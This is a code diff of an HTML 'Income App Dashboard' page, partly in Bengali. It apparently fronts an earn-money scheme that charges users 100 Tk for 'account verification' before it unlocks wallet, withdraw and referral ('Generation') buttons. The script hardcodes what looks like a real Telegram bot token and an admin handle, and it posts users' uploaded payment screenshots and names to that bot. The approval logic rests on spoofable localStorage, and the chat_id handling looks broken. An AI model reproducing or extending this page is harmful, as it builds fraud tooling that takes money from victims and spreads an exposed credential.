@@ -1,87 +1,96 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Income App Dashboard</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<style>
-body{
-  font-family: Arial;
-  background:#0f172a;
-  color:white;
-  text-align:center;
-}
-.box{
-  background:#1e293b;
-  padding:25px;
-  border-radius:12px;
-  max-width:420px;
-  margin:30px auto;
-}
-button{
-  padding:15px;
-  margin:10px;
-  width:85%;
-  border:none;
-  border-radius:10px;
-  font-size:18px;
-  background:#22c55e;
-  color:white;
-  cursor:pointer;
-}
-.disabled{
-  opacity:0.5;
-  pointer-events:none;
-}
-.menu-section{
-  margin-top:25px;
-  border-top:1px solid #555;
-  padding-top:20px;
-}
-a{
-  color:#22c55e;
-  text-decoration:none;
-  font-weight:bold;
-}
-a:hover{
-  text-decoration:underline;
-}
-</style>
+  <title>Income App Dashboard</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {font-family: Arial; background:#0f172a; color:white; text-align:center;}
+    .box {background:#1e293b;padding:20px;border-radius:12px;max-width:400px;margin:auto; margin-top:20px;}
+    button {padding:15px; margin:10px; width:80%; border:none; border-radius:10px; font-size:18px; background:#22c55e; color:white;}
+    .disabled {opacity:0.5; pointer-events:none;}
+  </style>
 </head>
 <body>
 
 <h2>💰 Income App Dashboard</h2>
 
-<!-- ✅ ACCOUNT VERIFY MESSAGE -->
 <div class="box">
-<h2>Account Verify — 100 Tk</h2>
-<p>
-১০০ টাকা পাঠিয়ে Telegram Bot এ স্ক্রিনশট জমা দিন: <br>
-<a href="https://t.me/Easyearnverify_bot" target="_blank">👉 Click to open Telegram</a>
-</p>
-<p>Status: <span id="status">Pending</span></p>
+  <h2>Account Verify — 100 Tk</h2>
+  <p>Send money → Upload screenshot to Telegram bot:</p>
+  <p>Bot: <b>@Easyearnverify_bot</b></p>
+
+  <input id="name" placeholder="Your Name">
+  <input type="file" id="file">
+  <button onclick="sendScreenshot()">Submit Screenshot</button>
+  <p id="status">Pending</p>
 </div>
 
-<!-- ✅ MENU -->
-<div id="menu" class="menu-section">
-<button class="disabled">📋 My Jobs & Proved</button>
-<button class="disabled">💎 Premium Package</button>
-<button class="disabled">🌳 Generation</button>
-<button class="disabled">💰 My Wallet</button>
-<button class="disabled">🏧 Withdraw</button>
-<button class="disabled">🔁 Transfer Balance</button>
-<button>📞 Support</button>
+<div class="box" id="menu">
+  <button class="disabled">📋 My Jobs & Proved</button>
+  <button class="disabled">💎 Premium Package</button>
+  <button class="disabled">🌳 Generation</button>
+  <button class="disabled">💰 My Wallet</button>
+  <button class="disabled">🏧 Withdraw</button>
+  <button class="disabled">🔁 Transfer Balance</button>
+  <button>📞 Support</button>
 </div>
 
 <script>
-// 🔹 Member Status
-let accountStatus = "pending"; 
-document.getElementById("status").innerText = accountStatus;
+const BOT_TOKEN = "8051092032:AAGSVOe8efxnJqnBhsM2wdOclA-qtf45V98";
+const ADMIN_ID = "@TakeItEasyHubcyou";
+const BOT_USERNAME = "@Easyearnverify_bot";
 
-// 🔹 Function to unlock menu (Admin approval simulation)
-function unlockMenu(){
-  accountStatus = "approved";
-  document.getElementById("status").innerText = accountStatus;
-  document.querySelectorAll("#menu button").forEach(btn => btn.classList.remove("disabled"));
+// Member username
+let telegramUsername = prompt("Enter your Telegram username (e.g., @username)");
+
+// Local storage simulation
+if(!localStorage.getItem('users')) localStorage.setItem('users', JSON.stringify({}));
+let users = JSON.parse(localStorage.getItem('users'));
+if(!users[telegramUsername]) users[telegramUsername] = "pending";
+localStorage.setItem('users', JSON.stringify(users));
+
+// Update status
+function updateStatus(){
+  users = JSON.parse(localStorage.getItem('users'));
+  let status = users[telegramUsername];
+  document.getElementById('status').innerText = "Status: " + status;
+
+  const buttons = document.querySelectorAll("#menu button");
+  if(status === "approved"){
+    buttons.forEach(btn => btn.classList.remove("disabled"));
+  } else {
+    buttons.forEach(btn => btn.classList.add("disabled"));
+  }
+}
+
+setInterval(updateStatus, 1000);
+
+// Send screenshot to Telegram Bot
+async function sendScreenshot(){
+  const file = document.getElementById("file").files[0];
+  const name = document.getElementById("name").value || telegramUsername;
+
+  if(!file){ alert("Please upload a screenshot"); return; }
+
+  const formData = new FormData();
+  formData.append("chat_id", ADMIN_ID.replace('@',''));
+  formData.append("photo", file);
+  formData.append("caption", `💰 New Verify Request\n\n👤 Name: ${name}\n🆔 User: ${telegramUsername}`);
+
+  try{
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+      method:"POST",
+      body: formData
+    });
+    if(res.ok){
+      alert("✅ Screenshot sent to Admin bot!");
+    } else {
+      alert("❌ Failed to send screenshot.");
+    }
+  }catch(err){
+    console.error(err);
+    alert("❌ Error sending screenshot.");
+  }
 }
 </script>
 
